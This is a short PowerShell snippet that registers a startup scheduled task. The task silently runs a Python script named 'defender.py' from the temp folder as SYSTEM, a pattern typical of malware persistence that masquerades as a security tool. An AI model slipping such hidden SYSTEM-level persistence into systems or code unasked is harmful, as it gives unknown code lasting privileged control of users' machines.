$ScriptPath = Join-Path $env:TEMP 'defender.py'
$Action = New-ScheduledTaskAction -Execute 'pythonw.exe' -Argument "`"$ScriptPath`""
$Trigger = New-ScheduledTaskTrigger -AtStartup
$TaskName = 'RunDefenderScriptAtStartup'
Register-ScheduledTask -Action $Action -Trigger $Trigger -TaskName $TaskName -User 'NT AUTHORITY\SYSTEM' -Force
